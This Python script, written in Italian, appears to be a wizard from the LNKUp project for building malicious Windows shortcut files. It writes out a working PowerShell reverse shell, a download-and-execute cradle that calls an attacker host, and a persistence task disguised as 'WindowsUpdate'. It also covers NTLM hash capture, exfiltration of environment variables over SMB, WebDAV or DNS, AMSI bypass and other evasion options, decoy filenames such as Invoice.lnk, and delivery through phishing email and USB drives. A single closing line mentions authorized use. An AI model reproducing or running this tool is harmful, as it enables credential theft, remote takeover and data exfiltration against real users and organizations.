#!/usr/bin/env python3
"""
LNK Payload Generator - Interactive Wizard
Guida interattiva per creare payload LNK personalizzati con spiegazioni dettagliate.
"""

import sys
from pathlib import Path
from typing import Optional, List, Dict, Any

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_banner():
    """Display wizard banner"""
    banner = f"""{Colors.CYAN}
  ╔═══════════════════════════════════════════════════════════╗
  ║                                                           ║
  ║        LNKUp - Interactive Payload Wizard 🧙              ║
  ║        Crea il tuo payload LNK step-by-step              ║
  ║                                                           ║
  ╚═══════════════════════════════════════════════════════════╝
{Colors.END}"""
    print(banner)

def print_section(title: str):
    """Print section header"""
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}{title}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}{'='*60}{Colors.END}\n")

def print_info(message: str):
    """Print info message"""
    print(f"{Colors.CYAN}ℹ  {message}{Colors.END}")

def print_success(message: str):
    """Print success message"""
    print(f"{Colors.GREEN}✓ {message}{Colors.END}")

def print_warning(message: str):
    """Print warning message"""
    print(f"{Colors.YELLOW}⚠  {message}{Colors.END}")

def print_error(message: str):
    """Print error message"""
    print(f"{Colors.RED}✗ {message}{Colors.END}")

def print_option(number: int, title: str, description: str):
    """Print numbered option with description"""
    print(f"{Colors.BOLD}{Colors.GREEN}[{number}]{Colors.END} {Colors.BOLD}{title}{Colors.END}")
    print(f"    {Colors.CYAN}{description}{Colors.END}")

def get_input(prompt: str, default: Optional[str] = None) -> str:
    """Get user input with optional default"""
    if default:
        prompt = f"{prompt} [{Colors.YELLOW}{default}{Colors.END}]: "
    else:
        prompt = f"{prompt}: "

    value = input(f"{Colors.BOLD}{prompt}{Colors.END}").strip()
    return value if value else default or ""

def get_choice(prompt: str, options: List[str], default: Optional[int] = None) -> int:
    """Get user choice from options"""
    while True:
        try:
            choice = input(f"{Colors.BOLD}{prompt}{Colors.END}").strip()
            if not choice and default is not None:
                return default

            choice_int = int(choice)
            if 1 <= choice_int <= len(options):
                return choice_int
            else:
                print_error(f"Scegli un numero tra 1 e {len(options)}")
        except ValueError:
            print_error("Inserisci un numero valido")
        except KeyboardInterrupt:
            print("\n")
            sys.exit(0)

def confirm(prompt: str, default: bool = True) -> bool:
    """Get yes/no confirmation"""
    default_str = "S/n" if default else "s/N"
    response = get_input(f"{prompt} ({default_str})", "s" if default else "n").lower()

    if response in ["s", "si", "y", "yes"]:
        return True
    elif response in ["n", "no"]:
        return False
    else:
        return default

class PayloadWizard:
    """Interactive wizard for LNK payload generation"""

    def __init__(self):
        self.config: Dict[str, Any] = {}
        self.payload_types = {
            1: {
                "name": "NTLM Hash Capture",
                "description": "Cattura gli hash NTLM quando l'utente visualizza la cartella",
                "icon": "🔐",
                "difficulty": "Facile",
                "stealth": "Alta",
                "use_cases": [
                    "Credential harvesting durante penetration test",
                    "Simulazione di attacco via USB/email",
                    "Cattura passiva senza esecuzione di codice"
                ],
                "requirements": [
                    "SMB listener (Responder, Impacket, Metasploit)",
                    "Network connectivity verso attacker"
                ],
                "detection": "Bassa - Nessuna esecuzione di codice, solo richiesta SMB"
            },
            2: {
                "name": "Environment Variable Exfiltration",
                "description": "Esfiltrazione di variabili d'ambiente (USERNAME, PATH, etc.)",
                "icon": "📊",
                "difficulty": "Media",
                "stealth": "Media",
                "use_cases": [
                    "Reconnaissance di informazioni di sistema",
                    "Mappatura dell'ambiente target",
                    "Verifica di configurazioni specifiche"
                ],
                "requirements": [
                    "SMB listener o WebDAV server",
                    "Variabili d'ambiente da estrarre"
                ],
                "detection": "Media - Path UNC con variabili nell'URL"
            },
            3: {
                "name": "Command Execution (PowerShell)",
                "description": "Esegue comandi PowerShell quando viene cliccato il LNK",
                "icon": "⚡",
                "difficulty": "Media",
                "stealth": "Media-Bassa",
                "use_cases": [
                    "Esecuzione di payload (reverse shell, beacon)",
                    "Download ed esecuzione di stage 2",
                    "Modifiche di sistema persistenti"
                ],
                "requirements": [
                    "PowerShell abilitato sul target",
                    "Evasion di AMSI/AV/EDR"
                ],
                "detection": "Media-Alta - Esecuzione di PowerShell con parametri sospetti"
            },
            4: {
                "name": "Hybrid (NTLM + Command + Exfil)",
                "description": "Combinazione di cattura NTLM, esecuzione comandi ed exfiltration",
                "icon": "🎯",
                "difficulty": "Avanzata",
                "stealth": "Bassa",
                "use_cases": [
                    "Massimizzare le informazioni catturate",
                    "Red team assessment completo",
                    "Simulazione APT multi-stage"
                ],
                "requirements": [
                    "Tutti i requirement dei metodi precedenti",
                    "Configurazione avanzata listener"
                ],
                "detection": "Alta - Attività multiple simultanee"
            },
            5: {
                "name": "WebDAV Exfiltration (HTTP/HTTPS)",
                "description": "Exfiltration via WebDAV su HTTP/HTTPS invece di SMB",
                "icon": "🌐",
                "difficulty": "Avanzata",
                "stealth": "Media-Alta",
                "use_cases": [
                    "Bypass di firewall che bloccano SMB",
                    "Exfiltration via traffico web legittimo",
                    "Ambienti con SMB disabilitato"
                ],
                "requirements": [
                    "WebDAV server configurato (Apache, IIS)",
                    "Certificato SSL (opzionale ma consigliato)"
                ],
                "detection": "Media - Traffico WebDAV potrebbe essere monitorato"
            },
            6: {
                "name": "Custom (Configurazione Avanzata)",
                "description": "Configurazione completamente personalizzata con tutte le opzioni",
                "icon": "🛠️",
                "difficulty": "Esperto",
                "stealth": "Variabile",
                "use_cases": [
                    "Scenari specifici non coperti dai preset",
                    "Testing di tecniche custom",
                    "Ricerca e sviluppo"
                ],
                "requirements": [
                    "Conoscenza approfondita di LNK, SMB, PowerShell",
                    "Comprensione di evasion techniques"
                ],
                "detection": "Variabile - Dipende dalla configurazione"
            }
        }

    def run(self):
        """Run the wizard"""
        print_banner()

        try:
            # Step 1: Choose payload type
            payload_type = self.choose_payload_type()

            # Step 2: Configure based on type
            if payload_type == 1:
                self.configure_ntlm_capture()
            elif payload_type == 2:
                self.configure_env_exfil()
            elif payload_type == 3:
                self.configure_command_execution()
            elif payload_type == 4:
                self.configure_hybrid()
            elif payload_type == 5:
                self.configure_webdav()
            elif payload_type == 6:
                self.configure_custom()

            # Step 3: Configure evasion options
            self.configure_evasion()

            # Step 4: Set output path
            self.set_output_path()

            # Step 5: Review and confirm
            if self.review_configuration():
                self.generate_payload()
            else:
                print_warning("Generazione annullata dall'utente")
                sys.exit(0)

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Wizard interrotto dall'utente{Colors.END}")
            sys.exit(0)
        except Exception as e:
            print_error(f"Errore nel wizard: {e}")
            sys.exit(1)

    def choose_payload_type(self) -> int:
        """Step 1: Choose payload type"""
        print_section("📋 Scelta Tipo di Payload")

        print_info("Scegli il tipo di payload LNK che vuoi generare:\n")

        for num, payload_info in self.payload_types.items():
            print(f"\n{Colors.BOLD}{payload_info['icon']} [{num}] {payload_info['name']}{Colors.END}")
            print(f"    {Colors.CYAN}Descrizione: {payload_info['description']}{Colors.END}")
            print(f"    {Colors.YELLOW}Difficoltà: {payload_info['difficulty']} | Stealth: {payload_info['stealth']}{Colors.END}")

        print()
        choice = get_choice("Seleziona il tipo di payload (1-6)", list(range(1, 7)))

        # Show detailed info
        self.show_payload_details(choice)

        if not confirm("Confermi questa scelta?", True):
            return self.choose_payload_type()

        self.config['payload_type'] = choice
        return choice

    def show_payload_details(self, payload_type: int):
        """Show detailed information about selected payload"""
        info = self.payload_types[payload_type]

        print(f"\n{Colors.BOLD}{Colors.CYAN}{'─'*60}{Colors.END}")
        print(f"{Colors.BOLD}Dettagli: {info['icon']} {info['name']}{Colors.END}\n")

        print(f"{Colors.BOLD}Casi d'uso:{Colors.END}")
        for use_case in info['use_cases']:
            print(f"  • {use_case}")

        print(f"\n{Colors.BOLD}Requisiti:{Colors.END}")
        for req in info['requirements']:
            print(f"  • {req}")

        print(f"\n{Colors.BOLD}Rilevabilità:{Colors.END} {info['detection']}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'─'*60}{Colors.END}\n")

    def configure_ntlm_capture(self):
        """Configure NTLM capture payload"""
        print_section("🔐 Configurazione NTLM Hash Capture")

        print_info("Questo payload catturerà gli hash NTLM quando:")
        print("  • L'utente apre la cartella contenente il file LNK")
        print("  • Windows tenta di caricare l'icona dal path UNC\n")

        # Get attacker host
        self.config['host'] = get_input("Indirizzo IP/hostname del tuo listener SMB", "192.168.1.100")

        print_info("\nDovrai configurare un listener SMB, ad esempio:")
        print(f"{Colors.YELLOW}  sudo responder -I eth0 -v{Colors.END}")
        print(f"{Colors.YELLOW}  sudo impacket-smbserver share . -smb2support{Colors.END}\n")

        self.config['ntlm_capture'] = True
        self.config['exfil_type'] = 'unc'
        self.config['execute'] = []  # No command execution
        self.config['vars'] = []

    def configure_env_exfil(self):
        """Configure environment variable exfiltration"""
        print_section("📊 Configurazione Environment Variable Exfiltration")

        print_info("Questo payload esfiltrerà variabili d'ambiente tramite il path UNC.\n")

        # Common variables
        print(f"{Colors.BOLD}Variabili comuni:{Colors.END}")
        common_vars = [
            ("USERNAME", "Nome utente corrente"),
            ("COMPUTERNAME", "Nome del computer"),
            ("USERDOMAIN", "Dominio dell'utente"),
            ("PROCESSOR_IDENTIFIER", "Tipo di processore"),
            ("OS", "Sistema operativo"),
            ("PATH", "Percorsi di sistema"),
            ("TEMP", "Directory temporanea"),
            ("USERPROFILE", "Path del profilo utente")
        ]

        for var, desc in common_vars:
            print(f"  • {Colors.GREEN}{var}{Colors.END}: {desc}")

        print()

        # Quick presets
        print(f"{Colors.BOLD}Preset veloci:{Colors.END}")
        print_option(1, "Base", "USERNAME, COMPUTERNAME")
        print_option(2, "Extended", "USERNAME, COMPUTERNAME, USERDOMAIN, OS")
        print_option(3, "Full", "USERNAME, COMPUTERNAME, USERDOMAIN, OS, PROCESSOR_IDENTIFIER")
        print_option(4, "Custom", "Inserisci manualmente le variabili")
        print()

        preset = get_choice("Scegli preset (1-4)", list(range(1, 5)))

        if preset == 1:
            vars_list = ["USERNAME", "COMPUTERNAME"]
        elif preset == 2:
            vars_list = ["USERNAME", "COMPUTERNAME", "USERDOMAIN", "OS"]
        elif preset == 3:
            vars_list = ["USERNAME", "COMPUTERNAME", "USERDOMAIN", "OS", "PROCESSOR_IDENTIFIER"]
        else:
            vars_input = get_input("Inserisci variabili separate da virgola", "USERNAME,COMPUTERNAME")
            vars_list = [v.strip() for v in vars_input.split(',')]

        print_success(f"Variabili selezionate: {', '.join(vars_list)}")

        self.config['host'] = get_input("\nIndirizzo IP/hostname del listener", "192.168.1.100")
        self.config['vars'] = vars_list
        self.config['ntlm_capture'] = False
        self.config['exfil_type'] = 'unc'
        self.config['execute'] = []

    def configure_command_execution(self):
        """Configure command execution payload"""
        print_section("⚡ Configurazione Command Execution")

        print_warning("ATTENZIONE: L'esecuzione di comandi è molto rilevabile!")
        print_info("Il comando verrà eseguito quando l'utente clicca sul file LNK.\n")

        # Command presets
        print(f"{Colors.BOLD}Esempi di comandi:{Colors.END}")
        print_option(1, "Reconnaissance", "whoami && hostname && ipconfig /all")
        print_option(2, "Download & Execute", "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://...')")
        print_option(3, "Reverse Shell (PowerShell)", "Reverse shell PowerShell base64-encoded")
        print_option(4, "Persistence", "Crea scheduled task o registry key")
        print_option(5, "Custom", "Inserisci comando personalizzato")
        print()

        choice = get_choice("Scegli tipo di comando (1-5)", list(range(1, 6)))

        if choice == 1:
            cmd = "whoami && hostname && ipconfig /all"
        elif choice == 2:
            url = get_input("URL del payload da scaricare", "http://192.168.1.100/payload.ps1")
            cmd = f"IEX(New-Object Net.WebClient).DownloadString('{url}')"
        elif choice == 3:
            ip = get_input("IP del listener", "192.168.1.100")
            port = get_input("Porta del listener", "4444")
            print_info("Generazione reverse shell PowerShell...")
            cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        elif choice == 4:
            task_name = get_input("Nome della scheduled task", "WindowsUpdate")
            cmd = f"schtasks /create /tn {task_name} /tr 'powershell.exe' /sc onlogon /rl highest"
        else:
            cmd = get_input("Inserisci il comando PowerShell da eseguire")

        print_success(f"Comando configurato: {cmd[:80]}{'...' if len(cmd) > 80 else ''}")

        # Ask if also want to capture NTLM
        if confirm("\nVuoi anche catturare hash NTLM?", False):
            self.config['host'] = get_input("Indirizzo IP/hostname del listener", "192.168.1.100")
            self.config['ntlm_capture'] = True
        else:
            self.config['ntlm_capture'] = False

        self.config['execute'] = [cmd]
        self.config['vars'] = []
        self.config['exfil_type'] = 'unc'

    def configure_hybrid(self):
        """Configure hybrid payload (NTLM + Command + Exfil)"""
        print_section("🎯 Configurazione Hybrid Payload")

        print_info("Configurazione avanzata che combina tutti i metodi:\n")

        # Host
        self.config['host'] = get_input("Indirizzo IP/hostname del listener", "192.168.1.100")

        # NTLM
        if confirm("Abilitare cattura NTLM?", True):
            self.config['ntlm_capture'] = True
        else:
            self.config['ntlm_capture'] = False

        # Environment variables
        if confirm("Abilitare exfiltration variabili d'ambiente?", True):
            vars_input = get_input("Variabili da esfiltare (separate da virgola)", "USERNAME,COMPUTERNAME,USERDOMAIN")
            self.config['vars'] = [v.strip() for v in vars_input.split(',')]
        else:
            self.config['vars'] = []

        # Command execution
        if confirm("Abilitare esecuzione comandi?", True):
            cmd = get_input("Comando da eseguire", "whoami")
            self.config['execute'] = [cmd]
        else:
            self.config['execute'] = []

        self.config['exfil_type'] = 'unc'

    def configure_webdav(self):
        """Configure WebDAV exfiltration"""
        print_section("🌐 Configurazione WebDAV Exfiltration")

        print_info("WebDAV permette exfiltration via HTTP/HTTPS invece di SMB.")
        print_info("Utile per bypassare firewall che bloccano la porta 445.\n")

        self.config['host'] = get_input("Hostname del server WebDAV", "attacker.example.com")

        # SSL
        if confirm("Usare HTTPS (SSL)?", True):
            self.config['ssl'] = True
            self.config['port'] = int(get_input("Porta", "443"))
        else:
            self.config['ssl'] = False
            self.config['port'] = int(get_input("Porta", "80"))

        self.config['webdav_path'] = get_input("Path WebDAV", "/webdav")

        print_info("\nDovrai configurare un server WebDAV, ad esempio:")
        print(f"{Colors.YELLOW}  Apache: Enable mod_dav, mod_dav_fs{Colors.END}")
        print(f"{Colors.YELLOW}  IIS: Enable WebDAV Publishing{Colors.END}\n")

        # Environment variables
        if confirm("Esfiltare variabili d'ambiente?", True):
            vars_input = get_input("Variabili (separate da virgola)", "USERNAME,COMPUTERNAME")
            self.config['vars'] = [v.strip() for v in vars_input.split(',')]
        else:
            self.config['vars'] = []

        self.config['ntlm_capture'] = False
        self.config['exfil_type'] = 'webdav'
        self.config['execute'] = []

    def configure_custom(self):
        """Configure custom payload"""
        print_section("🛠️  Configurazione Custom")

        print_info("Configurazione completamente personalizzata.\n")

        # Exfiltration type
        print(f"{Colors.BOLD}Tipo di exfiltration:{Colors.END}")
        print_option(1, "UNC (SMB)", "Path \\\\host\\share")
        print_option(2, "WebDAV (HTTP/HTTPS)", "Path \\\\host@SSL\\path")
        print_option(3, "DNS", "Subdomain encoding")
        print()

        exfil_choice = get_choice("Scegli metodo (1-3)", [1, 2, 3])

        if exfil_choice == 1:
            self.config['exfil_type'] = 'unc'
            self.config['host'] = get_input("Host")
        elif exfil_choice == 2:
            self.config['exfil_type'] = 'webdav'
            self.config['host'] = get_input("Host")
            self.config['ssl'] = confirm("Usare SSL?", True)
            self.config['port'] = int(get_input("Porta", "443" if self.config['ssl'] else "80"))
            self.config['webdav_path'] = get_input("Path", "/webdav")
        else:
            self.config['exfil_type'] = 'dns'
            self.config['host'] = get_input("Dominio per DNS exfil", "attacker.com")

        # NTLM
        self.config['ntlm_capture'] = confirm("\nCattura NTLM?", False)

        # Variables
        if confirm("Esfiltare variabili d'ambiente?", False):
            vars_input = get_input("Variabili (separate da virgola)")
            self.config['vars'] = [v.strip() for v in vars_input.split(',') if v.strip()]
        else:
            self.config['vars'] = []

        # Command
        if confirm("Eseguire comandi?", False):
            cmd = get_input("Comando")
            self.config['execute'] = [cmd]
        else:
            self.config['execute'] = []

    def configure_evasion(self):
        """Configure evasion options"""
        print_section("🛡️  Opzioni di Evasion")

        print_info("Configura le tecniche di evasion AV/EDR.\n")

        # AMSI bypass
        print(f"{Colors.BOLD}AMSI Bypass{Colors.END}")
        print("  Tenta di bypassare Antimalware Scan Interface di Windows")
        self.config['amsi_bypass'] = confirm("  Abilitare AMSI bypass?", True)

        # Jitter
        print(f"\n{Colors.BOLD}Jitter (Random Delay){Colors.END}")
        print("  Aggiunge un ritardo casuale per evitare pattern detection")
        if confirm("  Abilitare jitter?", True):
            min_jitter = int(get_input("  Ritardo minimo (ms)", "500"))
            max_jitter = int(get_input("  Ritardo massimo (ms)", "3000"))
            self.config['jitter_min'] = min_jitter
            self.config['jitter_max'] = max_jitter
        else:
            self.config['jitter_min'] = 0
            self.config['jitter_max'] = 0

        # Legitimate target
        print(f"\n{Colors.BOLD}LOLBAS Proxy Execution{Colors.END}")
        print("  Usa binari legittimi Windows (explorer.exe, rundll32.exe) come proxy")
        self.config['legitimate_target'] = confirm("  Abilitare LOLBAS proxy?", True)

        # Timestamp spoofing
        print(f"\n{Colors.BOLD}Timestamp Spoofing{Colors.END}")
        print("  Modifica i timestamp del file per sembrare più vecchio")
        self.config['fake_timestamp'] = confirm("  Abilitare timestamp spoofing?", True)

        # Size randomization
        print(f"\n{Colors.BOLD}File Size Randomization{Colors.END}")
        print("  Randomizza la dimensione del file LNK")
        self.config['randomize_size'] = confirm("  Abilitare randomizzazione size?", True)

    def set_output_path(self):
        """Set output file path"""
        print_section("💾 Output File")

        default_name = "payload.lnk"

        # Suggest filename based on payload type
        payload_type = self.config.get('payload_type', 1)
        suggestions = {
            1: "Document.lnk",
            2: "Report.lnk",
            3: "Invoice.lnk",
            4: "Important.lnk",
            5: "Data.lnk",
            6: "Custom.lnk"
        }

        print_info(f"Suggerimento: Usa nomi innocui come '{suggestions.get(payload_type, default_name)}'")
        print_info("I file verranno salvati nella cartella 'output/'")

        filename = get_input("Nome del file LNK da creare", suggestions.get(payload_type, default_name))

        # Ensure output directory exists
        from pathlib import Path
        output_dir = Path("output")
        output_dir.mkdir(exist_ok=True)

        # Prepend output/ to filename if not already present
        if not filename.startswith("output/"):
            filename = f"output/{filename}"

        self.config['output'] = filename

    def review_configuration(self) -> bool:
        """Review configuration before generation"""
        print_section("📝 Riepilogo Configurazione")

        payload_type_name = self.payload_types[self.config.get('payload_type', 1)]['name']

        print(f"{Colors.BOLD}Tipo Payload:{Colors.END} {payload_type_name}")
        print(f"{Colors.BOLD}Output File:{Colors.END} {self.config.get('output', 'N/A')}")
        print(f"{Colors.BOLD}Host:{Colors.END} {self.config.get('host', 'N/A')}")

        if self.config.get('ntlm_capture'):
            print(f"{Colors.BOLD}NTLM Capture:{Colors.END} {Colors.GREEN}✓ Abilitato{Colors.END}")

        if self.config.get('vars'):
            print(f"{Colors.BOLD}Variabili:{Colors.END} {', '.join(self.config['vars'])}")

        if self.config.get('execute'):
            cmd = self.config['execute'][0]
            print(f"{Colors.BOLD}Comando:{Colors.END} {cmd[:60]}{'...' if len(cmd) > 60 else ''}")

        print(f"\n{Colors.BOLD}Evasion:{Colors.END}")
        print(f"  • AMSI Bypass: {'✓' if self.config.get('amsi_bypass') else '✗'}")
        print(f"  • Jitter: {'✓' if self.config.get('jitter_max', 0) > 0 else '✗'}")
        print(f"  • LOLBAS Proxy: {'✓' if self.config.get('legitimate_target') else '✗'}")
        print(f"  • Timestamp Spoofing: {'✓' if self.config.get('fake_timestamp') else '✗'}")

        print()
        return confirm("Confermi e procedi con la generazione?", True)

    def generate_payload(self):
        """Generate the payload using generate_new.py"""
        print_section("🚀 Generazione Payload")

        print_info("Generazione in corso...\n")

        # Build command line for generate_new.py
        cmd_parts = ["python", "generate_new.py"]

        # Output
        cmd_parts.extend(["--output", self.config['output']])

        # Host
        if 'host' in self.config:
            cmd_parts.extend(["--host", self.config['host']])

        # Type
        if self.config.get('ntlm_capture') and not self.config.get('vars') and not self.config.get('execute'):
            cmd_parts.extend(["--type", "ntlm"])
        elif self.config.get('vars') and not self.config.get('ntlm_capture'):
            cmd_parts.extend(["--type", "environment"])
            cmd_parts.extend(["--vars", ",".join(self.config['vars'])])
        elif self.config.get('vars') or self.config.get('ntlm_capture'):
            cmd_parts.extend(["--type", "all"])
            if self.config.get('vars'):
                cmd_parts.extend(["--vars", ",".join(self.config['vars'])])

        # Execute
        if self.config.get('execute'):
            cmd_parts.extend(["--execute"] + self.config['execute'])

        # Show command
        print(f"{Colors.YELLOW}Comando:{Colors.END} {' '.join(cmd_parts)}\n")

        # Execute
        import subprocess
        try:
            # Activate venv if exists
            venv_python = Path(".venv/bin/python")
            if venv_python.exists():
                cmd_parts[0] = str(venv_python)

            result = subprocess.run(cmd_parts, capture_output=True, text=True)

            if result.returncode == 0:
                print_success("Payload generato con successo!")
                print(result.stdout)

                # Show next steps
                self.show_next_steps()
            else:
                print_error("Errore durante la generazione:")
                print(result.stderr)

        except Exception as e:
            print_error(f"Errore: {e}")

    def show_next_steps(self):
        """Show next steps after generation"""
        print_section("🎯 Prossimi Passi")

        payload_type = self.config.get('payload_type', 1)

        if payload_type == 1 or self.config.get('ntlm_capture'):
            print(f"{Colors.BOLD}1. Avvia un listener SMB:{Colors.END}")
            print(f"   {Colors.CYAN}sudo responder -I eth0 -v{Colors.END}")
            print(f"   oppure")
            print(f"   {Colors.CYAN}sudo impacket-ntlmrelayx -tf targets.txt -smb2support{Colors.END}\n")

        if payload_type == 3 or self.config.get('execute'):
            print(f"{Colors.BOLD}2. Se hai configurato una reverse shell, avvia il listener:{Colors.END}")
            print(f"   {Colors.CYAN}nc -lvnp 4444{Colors.END}")
            print(f"   oppure")
            print(f"   {Colors.CYAN}msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; ...'{Colors.END}\n")

        if payload_type == 5 or self.config.get('exfil_type') == 'webdav':
            print(f"{Colors.BOLD}3. Configura il server WebDAV{Colors.END}\n")

        print(f"{Colors.BOLD}4. Distribuisci il payload:{Colors.END}")
        print(f"   • USB drive con nome innocuo")
        print(f"   • Email phishing con attachment")
        print(f"   • File share aziendale")
        print(f"   • SMB share pubblico\n")

        print(f"{Colors.BOLD}5. Monitora i log:{Colors.END}")
        print(f"   Controlla il tuo listener per le connessioni in arrivo\n")

        print_warning("⚠️  RICORDA: Usa solo in ambienti autorizzati e con consenso scritto!")

def main():
    """Main entry point"""
    wizard = PayloadWizard()
    wizard.run()

if __name__ == "__main__":
    main()
